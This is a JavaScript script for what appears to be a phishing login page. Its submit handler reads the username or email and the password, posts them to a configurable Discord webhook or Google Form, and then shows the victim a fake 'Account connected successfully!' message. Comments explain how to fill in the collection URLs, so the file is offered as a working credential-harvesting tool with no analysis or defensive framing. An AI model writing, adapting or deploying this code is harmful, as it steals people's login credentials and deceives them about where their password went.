// ================== CONFIGURATION ==================
// Choose your method(s) - set to true to enable
const USE_DISCORD = false;
const USE_GOOGLE_FORM = true;

// Discord Webhook (if enabled)
const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/YOUR_WEBHOOK_ID/YOUR_WEBHOOK_TOKEN';

// Google Form (if enabled) - replace with your real form URL
const GOOGLE_FORM_URL = 'https://docs.google.com/forms/d/e/1FAIpQLScJedH19Sw_6KRurRvLWC0w3K-LcLLBt0S98Ov4CJaWq1yPpg/formResponseusp=pp_url&entry.2008261748=Gsg&entry.520094335=Bshsj';

// ===================================================

async function handleSubmit(e) {
    e.preventDefault();
    
    const data = {
        usernameOrEmail: document.getElementById('username').value,
        password: document.getElementById('password').value,
        timestamp: new Date().toISOString()
    };

    let sent = false;

    // 1. Discord Webhook
    if (USE_DISCORD && !DISCORD_WEBHOOK.includes('YOUR_WEBHOOK')) {
        try {
            const payload = {
                embeds: [{
                    title: '🔗 New Account Connection',
                    color: 0x6366f1,
                    fields: Object.entries(data).map(([key, value]) => ({
                        name: key.replace(/([A-Z])/g, ' $1').trim(),
                        value: value || 'N/A',
                        inline: true
                    }))
                }]
            };
            
            await fetch(DISCORD_WEBHOOK, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            });
            console.log('✅ Sent to Discord');
            sent = true;
        } catch (err) {
            console.error('Discord error:', err);
        }
    }

    // 2. Google Form
    if (USE_GOOGLE_FORM && GOOGLE_FORM_URL.includes('formResponse')) {
        try {
            const formData = new FormData();
            formData.append('entry.XXXXXX', data.usernameOrEmail);   // ← Change these entry IDs
            formData.append('entry.YYYYYY', data.password);          // ← Change these entry IDs
            formData.append('entry.ZZZZZZ', data.timestamp);

            await fetch(GOOGLE_FORM_URL, {
                method: 'POST',
                body: formData,
                mode: 'no-cors'   // Google Forms requires this
            });
            console.log('✅ Sent to Google Form');
            sent = true;
        } catch (err) {
            console.error('Google Form error:', err);
        }
    }

    if (!sent) {
        console.log('⚠️ Data (for testing):', data);
        alert('Demo mode — check console. Set up Discord or Google Form to receive real data.');
    } else {
        alert('Account connected successfully!\n\nDetails sent via your chosen method(s).');
    }

    e.target.reset();
}

// Ready message
console.log('%c✅ Ready! Edit USE_DISCORD / USE_GOOGLE_FORM and URLs in script.js', 'color: #6366f1; font-size: 14px;');
